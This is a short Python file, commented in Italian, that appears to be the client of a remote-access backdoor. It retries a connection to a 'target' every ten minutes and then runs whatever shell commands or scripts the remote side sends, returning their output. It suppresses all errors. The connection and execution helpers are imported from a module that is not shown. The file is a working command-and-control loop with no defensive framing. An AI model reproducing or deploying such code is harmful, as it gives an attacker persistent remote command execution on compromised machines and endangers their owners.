#import
import function
import time
Connection = function.Connection()
Comand = function.Comand()

# loop che tenta la connessione al targhet ogni 10 min
def tryconn():
    while True:
        stat_conn = Connection.INIT_CONN()
        if stat_conn == True:
            break
        time.sleep(600)

# funzione che esegue le operazioni richieste
def service():
    try:
        while True:
            try:
                payload = Connection.RECV().decode()
            except:
                break
            if payload != False:
                payload = list(payload)
                index = []
                index.append(payload[0])
                index.append(payload[1])
                index.append(payload[2])
                index = "".join(index)
                payload.pop(0)
                payload.pop(0)
                payload.pop(0)
                payload = "".join(payload)

                # esegue un comando
                if index == "com":
                    output = Comand.EX_COMMAND(payload)
                    Connection.SEND(output)
                #esegue uno script
                elif index == "scr":
                    output = Comand.EX_SCRIPT(payload)
                    Connection.SEND(output)
                else:
                    pass
            else:
                break
    except:
        pass

while True:
    tryconn()
    service()